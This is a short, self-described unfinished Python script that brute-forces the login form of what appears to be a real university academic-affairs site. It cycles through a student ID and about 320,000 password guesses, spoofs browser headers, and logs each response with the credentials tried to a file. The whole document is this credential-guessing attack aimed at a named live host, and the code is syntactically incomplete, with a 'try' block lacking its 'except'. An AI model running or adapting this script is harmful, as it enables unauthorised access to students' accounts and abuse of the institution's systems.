#! /usr/bin/env python3
# -*- coding:utf-8 -*-

'''
unfinished
'''


from urllib import request, parse
import os

url = 'http://59.77.226.32/logincheck.asp'
head = {
	'User-Agent': 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)',
	'Referer': 'http://jwch.fzu.edu.cn/',
	'Content-Type': 'application/x-www-form-urlencoded',
}

path = os.path.abspath('.')
f = open(path + '/result.txt', 'a')

req = request.Request(url, headers = head)
data = {'muser': '', 'passwd': '', 'x': '0', 'y': '0'}

for x in range(10)[1:2]:
	data['muser'] = '0315011' + format(x, '02d')
	for y in range(32):
		for z in range(10000):
			data['passwd'] = format(y, '02d') + format(z, '04d')
			try :
				response = request.urlopen(req, data = parse.urlencode(data).encode('utf-8'))
				f.write(response.read().decode('utf-8'))
				f.write('muser = %s\tpasswd = %s\n' % (data['muser'], data['passwd']))

f.close()
